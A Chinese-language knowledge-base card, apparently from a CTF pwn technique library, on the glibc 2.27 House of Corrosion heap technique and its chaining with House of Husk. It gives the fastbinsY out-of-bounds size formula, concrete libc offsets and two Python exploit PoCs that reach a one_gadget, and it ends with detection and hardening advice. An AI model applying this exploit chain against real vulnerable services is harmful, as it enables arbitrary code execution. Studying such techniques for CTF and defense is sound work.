---
id: binary-pwn-heap-house-of-corrosion-fastbiny-oob-io-list-all-null-fp
title: House of Corrosion：放大 global_max_fast 后用超大 chunk 造成 main_arena.fastbinsY 数组越界写，按 size=(target-top)*2-0x10 精确落到 _IO_list_all / printf 表并配合 House of Husk 取 one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: house-of-corrosion-fastbiny-oob-write
aliases:
- House of Corrosion
- house_of_corrosion
- fastbinsY 数组越界
- fastbin 索引越界写 main_arena
- global_max_fast 放大后 fastbin 越界
- _IO_list_all 伪造
- Corrosion 与 Husk 交叉利用
tags:
- pwn
- heap
- glibc227
- house-of-corrosion
- house-of-husk
- fastbin
- fastbinsY
- main-arena
- global-max-fast
- unsorted-bin
- io-list-all
- printf-arginfo-table
- one-gadget
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:30:41+08:00'
  notes: 已对照原文核对；原理/公式 size=(target-top)*2-0x10、0xa10/0x4af8/0xc30 三处偏移与两条 PoC 均与正文一致；本次核对未读取图片，img/01-06.png 所示越界示意与伪造 FILE 现场未读图核对，按正文文字复述；偏移量为例题 glibc2.27 环境值，卡内已注明需按目标 libc 重算；未编译或执行文中程序与 EXP
---

## 一句话结论

House of Corrosion 是 House of Husk 的「写原语」替代品：先用 unsorted bin attack / large bin attack 把 `global_max_fast` 抬成一个巨大的 libc 地址，使任意大小的 chunk 都能进 fastbin；随后申请一个尺寸由 `size=(target_addr-top)*2-0x10` 反推出来的超大 chunk 并 `free`，fastbin 索引就会越出 `main_arena.fastbinsY[10]` 数组边界，把这个 chunk 的堆地址写到 `main_arena` 下方任意目标（`_IO_list_all`、`__printf_function_table`、`__printf_arginfo_table`、`__malloc_hook` 等）；把目标内容布置成「表指针 + one_gadget 槽位」后再触发 printf 慢路径或 `_IO_flush_all_lockp`，得到受控函数调用。

## 原理

- `main_arena` 里 `fastbinsY` 是定长 10 项数组，`free` 一个 fastbin 尺寸的 chunk 时写入位置为 `&fastbinsY[idx]`，其中 `idx = (size >> 4) - 2`。当被 free 的 chunk 的 size 超过 `global_max_fast` 上限（默认 0x80，被放大后可达任意 libc 地址量级），`idx` 就会冲出数组，写到 `main_arena` 结构体内部甚至其下方的其他 libc 全局变量上，形成一个「地址受控、写入值受控（= 该 chunk 的用户区地址）」的写原语。
- 关键在于 size 与目标地址的换算：因为 `&fastbinsY[idx] = &fastbinsY + idx*8 = fastbinsY + ((size>>4)-2)*8 = fastbinsY + size/2 - 0x10`，所以想写到 `target`，预先申请（并最终 free）的 chunk size 必须满足 `size = (target_addr - top)*2 - 0x10`，其中 `top` 是 libc 中 `main_arena.fastbinsY` 的地址。文章用 `0xa10*2-0x10` 命中 `_IO_list_all`（`fastbinsY` 到 `_IO_list_all` 的距离为 0xa10），用 `0x4af8*2-0x10`、`0xc30*2-0x10` 分别命中 `__printf_function_table`、`__printf_arginfo_table`。
- 单个 chunk 只能覆盖一个 8 字节槽。由于写入值是 chunk 用户区地址而非任意值，写法上采用「先用 unsorted bin 把目标置为一个 libc 地址（例如 `_IO_list_all` 或 printf 表指针），再用 fastbin 越界把堆地址写进去」的两步组合，让目标从「非空但不可控」变成「指向攻击者控制的堆内存」。
- 与 House of Husk 的分工：Husk 关心「怎么让 printf 调到一个受控指针」，Corrosion 关心「怎么把那个指针写成堆地址」，两者可以串联——Corrosion 把 `__printf_function_table` 写成非空（绕过 `vfprintf` 的 handler 表检查）、把 `__printf_arginfo_table` 写成堆块地址，Husk 侧再让 `__printf_arginfo_table[spec]` 指向 one_gadget。
- 前置条件是能泄漏 libc 基址并对已 free 的 chunk 做 UAF 写：文章例题的菜单只有 malloc/edit/dump/free，size 下限被强行抬到 1280（0x500），edit 长度取自同一个 size 数组，于是 UAF 后可以把 unsorted bin 的 fd/bk 改写成 `p64(leak) + p64(global_max_fast-0x10)`，`malloc` 触发 unsorted bin attack 把 `global_max_fast` 覆盖成大值。
- 触发点选择：例题源码里 `printf("%X", 0LL)` 的 `%X` 是用户用 `__register_printf_specifier` 注册过的自定义 spec（`'X' = 0x58 = 88`），因此 `__printf_arginfo_table[88]` 会被无条件取用，无需构造参数个数。这把「Husk 需要一个能触发慢路径的 printf」和「程序自带 %X」两件事对上了。

## 触发条件

- glibc 堆题，存在 UAF 或堆溢出可以改写已释放 chunk 的 `fd`/`bk`；能泄漏至少一个 libc 地址（unsorted bin 的 `main_arena` 指针）。
- 能 free 一个尺寸由攻击者控制的 chunk（例题中 size 完全由输入决定，只是被抬到下限 0x500，仍足以覆盖到目标偏移），且目标偏移换算出的 size 落在 `size` 字段可表示范围内。
- `global_max_fast` 需要先被放大：能对 unsorted bin 或 large bin 做 attack（UAF 写 unsorted bin 的 bk，或 large bin 的 bk_nextsize），否则超大 chunk 的 free 会走 unsorted bin 而不是 fastbin。
- 存在可被反复 free/malloc 的循环以布置 `main_arena` 下方的数据（`_IO_list_all` 链或 printf 表 + one_gadget 槽位）。
- 目标 libc 版本偏移已知：`main_arena.fastbinsY` 到 `_IO_list_all`、`__printf_function_table`、`__printf_arginfo_table`、`__malloc_hook` 的距离因版本而异，必须按目标 libc 重算，不能照抄例题的值。

## 利用步骤

1. 常规堆信息泄漏：申请一个大于 fastbin 上限的 chunk（例题为 0x560），free 后 `dump` 读出 unsorted bin 的 fd，得到 libc 基址；例题用 `libc_base = leak - 0x70 - __malloc_hook` 反推。
2. 按目标选择 chunk 尺寸：算出 `fastbinsY` 到目标的距离 `d`，取 `size = d*2 - 0x10`。写 `_IO_list_all` 用 `d=0xa10`；写 printf 表分别用 `d=0x4af8`（`__printf_function_table`）与 `d=0xc30`（`__printf_arginfo_table`）。
3. 用这些尺寸申请 chunk 并记录下标，随后 free 掉用于泄漏的 chunk，通过 UAF 把它的 `fd`/`bk` 改成 `p64(leak) + p64(global_max_fast-0x10)`，再 `malloc` 同尺寸触发 unsorted bin attack，把 `global_max_fast` 写成一个大 libc 地址。
4. free 那个超大 chunk：此时它的 size 已在 `global_max_fast` 之下，free 进入 fastbin，fastbin 头指针被写到 `&fastbinsY[idx]`，即目标地址（例如 `_IO_list_all`），写入值是该 chunk 的用户区地址。
5. 在被指向的堆块上布置伪造结构：伪造 `_IO_FILE_plus` 时让 `flags` 对齐原 chunk 的 `prev_size`、后续字段按 `_IO_flush_all_lockp` 的检查顺序铺开，并把 `vtable` 指到可控区域；或布置 printf 表时让表指针非空、`[spec]` 槽位放 one_gadget。
6. 触发：退出时 `_IO_flush_all_lockp` 遍历 `_IO_list_all` 调 `vtable->__overflow`；或任意一次 `printf`（例题是 `printf("%X", 0LL)`）因 `__printf_function_table != NULL` 走 `do_positional → printf_positional → __parse_one_specmb`，最终 `(*__printf_arginfo_table[spec])(...)` 调到 one_gadget。
7. 与 Husk 串联时，可以先 free 小尺寸 chunk 命中 `__printf_function_table`（把表指针写成堆地址，非空即可过检查），再 free 另一个尺寸命中 `__printf_arginfo_table`（写成另一个堆块地址），把两个堆块内容分别布置成「表 + one_gadget」和「`[88] = one_gadget`」，最后一次 printf 收尾。

## PoC

例题（glibc 2.27，菜单 malloc/edit/dump/free，size 下限 0x500，源码里自带 `printf("%X", 0LL)`）的关键步骤，偏移按 2.27 写死，实际需按目标 libc 重算：

```python
add(0x560)              # 0: 用于泄漏 unsorted bin fd
add(0x4af8*2-0x10)      # 1: 命中 __printf_function_table
add(0xc30*2-0x10)       # 2: 命中 __printf_arginfo_table
add(0x500)              # 3
dele(0); show(0)
libc_base = leak - 0x70 - libc.sym['__malloc_hook']
og = libc_base + 0x10a2fc
global_max_fast      = libc_base + 0x3ed940
printf_arginfo_table = libc_base + 0x3ec870
printf_function_table= libc_base + 0x3f0738

edit(0, p64(libc_base+0x70+libc.sym['__malloc_hook']) + p64(global_max_fast-0x10))
add(0x560)              # 4: 触发 unsorted bin attack，global_max_fast 被放大
dele(2)                 # fastbin 越界：把 chunk2 地址写进 __printf_arginfo_table 附近
edit(2, b'abcdefgh'*(0x58-2) + p64(og))   # 令 arginfo_table[0x58] = one_gadget
dele(1)                 # 再把堆地址写进 __printf_function_table，过非空检查
```

另一条更短的链路（只用 `_IO_list_all`，不接 Husk）：

```python
add(0, 0x500)
add(1, 0xa10*2+0x20-0x10)   # fastbinsY 到 _IO_list_all 距离 0xa10
dele(0); show(0)
libc_base = leak - 0x3ebca0
max_fast  = libc_base + 0x3ed940
edit(0, p64(leak) + p64(max_fast-0x10))   # unsorted bin attack 放大 global_max_fast
add(0, 0x500)
dele(1)                                   # chunk1 地址写入 _IO_list_all
edit(1, fake_IO_FILE_plus)                # 布置伪造 FILE 与 vtable
```

## 变体与关联

- 目标变体：`main_arena` 下方的任意全局变量都可以做落点——`_IO_list_all`、`__printf_function_table`、`__printf_arginfo_table`、`__free_hook`、`__malloc_hook`、`_IO_2_1_stdout_` 的 `vtable` 等，只需按 `(target-top)*2-0x10` 重算 size。
- 放大 `global_max_fast` 的手段变体：unsorted bin attack（把 `bk` 改成 `global_max_fast-0x10`）、large bin attack（`bk_nextsize` 写一个堆地址）、或直接利用已有的任意写；文章把这三类并列列出。
- 触发点变体：不接 Husk 时走 `_IO_flush_all_lockp`（exit 或 `fflush`）；接 Husk 时走 `printf` 慢路径；例题用程序自带的 `%X`（spec 0x58）省掉参数构造。
- 关联：[[binary-pwn-heap-house-of-husk-printf-arginfo-table-global-max-fast-onegadget]]（本卡的 printf 表侧细讲与触发链）、[[binary-pwn-heap-house-of-husk]] 系列的其他写原语变体；large bin attack 与 unsorted bin attack 的基础卡见 heap 目录下相应条目。

## 检测与防御

- **加固**：升级 glibc（`global_max_fast` 在较新版本中被加固，fastbin 索引越界在 2.32+ 的检查更严格）；编译时加 `-D_FORTIFY_SOURCE`、开启 full RELRO + PIE 提高信息泄漏门槛。
- **代码层**：菜单类程序对 index 做上下界校验、free 后指针置空、edit 长度不能取自可被用户改写或与 `malloc` 复用的同一数组；避免 `printf` 使用未注册的自定义 spec。
- **检测**：`global_max_fast` 被改成异常大值（正常应为 0x80 量级）；fastbin 链表中出现远超 0x80 的 size；`main_arena` 结构体内出现堆地址；`_IO_list_all` 指向堆；`__printf_function_table`/`__printf_arginfo_table` 由 NULL 变为堆地址（正常只有显式注册自定义 spec 时才会非空）。
- **利用面收敛**：进程启动后只注册必需的自定义格式化字符，避免把 `printf` 变成间接调用入口。
